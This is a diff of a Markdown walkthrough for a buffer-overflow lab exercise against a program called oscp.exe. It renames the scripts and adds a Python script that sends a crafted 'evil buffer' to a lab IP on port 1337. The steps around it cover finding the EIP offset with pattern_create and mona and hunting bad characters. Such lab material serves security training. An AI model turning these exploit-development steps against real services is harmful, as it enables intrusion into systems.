@@ -19,7 +19,7 @@
     
 - Make a note of the largest number of bytes that were sent.
 
-    - `python_fuzzing.py` (chmod +x)
+    - `overflow1_step1_fuzzing.py` (chmod +x)
 
 ```python
 #!/usr/bin/env python3
@@ -60,13 +60,13 @@ while True:
 
     - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600` 
 
-- Copy the output and place it into the payload variable of the `exploit.py` script. 
+- Copy the output and place it into the payload variable of the `overflow1_step2_exploit.py` script. 
 
 - Create:
 
-    - `python_exploit.py` (chmod +x)
+    - `overflow1_step2_exploit.py` (chmod +x)
 
-- **Empty version:**
+        - **Empty version:**
 
 ```python
 import socket
@@ -109,19 +109,21 @@ except:
 
     - `EIP contains normal pattern : ... (offset XXXX)` 
     
-1. Update your `exploit.py` script and set the `offset` variable to the value showed by `mona` `EIP offset` **(was previously set to 0)**. 
+1. Update your `overflow1_step2_exploit.py` script and set the `offset` variable to the value showed by `mona` `EIP offset` **(was previously set to 0)**. 
 
 2. Set the `payload` variable to an **empty string again**. 
 
 3. Set the `retn` variable to `BBBB`.
 
-4. Restart `oscp.exe` in `Immunity Debugger` and run the modified `python_exploit.py` script again. 
+4. Restart `oscp.exe` in `Immunity Debugger` and run the modified `overflow1_step2_exploit.py` script again. 
 
     - The `EIP` register should now be overwritten with the 4 B's **(BBBB)** `42424242`. 
 
-    - `python_exploit.py` (chmod +x)
+- Create:
 
-- **Final Script:**
+    - `overflow1_step2_exploit.py` (chmod +x)
+
+        - **Exploit Script Ready:**
 
 ```python
 import socket
@@ -172,9 +174,44 @@ for x in range(1, 256):
 print()
 ```
 
-- Update your `python_exploit.py` script and set the `payload` variable **to the string of bad chars the script generates.**
+- Update your `overflow1_step2_exploit.py` script and set the `payload` variable **to the string of bad chars the script generates.**
 
-- Restart `oscp.exe` in `Immunity Debugger` and run the **modified `python_exploit.py` script** again. 
+    - I will call this script `overflow1_step3_findBadchars.py`
+
+- Create:
+
+    - `overflow1_step3_findBadchars.py` (chmod +x)
+
+        - **Exploit Script Ready:**
+
+```python
+import socket
+
+ip = "10.10.56.134"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 0
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = "necesito poner algo aqui weyyyyyyyyyyyyy"
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```    
+
+- Restart `oscp.exe` in `Immunity Debugger` and run the `overflow1_step3_findBadchars.py` script**. 
 
     - **Make a note of the address to which the `ESP` register points and use it in the following `mona` command:**
     
@@ -196,15 +233,17 @@ print()
 
 - **Find Badchars:**
     
-    1. The first badchar in the list should be the null byte (\x00) since we already removed it from the file. 
+    1. The first badchar in the list should be the null byte `\x00` since we already removed it from the file. 
     
     2. Make a note of any others. 
     
     3. Generate a new `bytearray` in `mona`, specifying these new `badchars` along with `\x00`. 
     
-    4. Then update the `payload` variable in your `python_exploit.py` script and remove the **new badchars** as well.
+    4. Then update the `payload` variable in your `overflow1_step3_findBadchars.py` script and remove the **new badchars** as well.
 
-    5. Restart `oscp.exe` in `Immunity Debugger` and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist. 
+    5. Restart `oscp.exe` in `Immunity Debugger` and run the `overflow1_step3_findBadchars.py` script again. 
+    
+    6. **Repeat the badchar comparison until the results status returns `Unmodified`. This indicates that no more badchars exist.** 
         
         
 
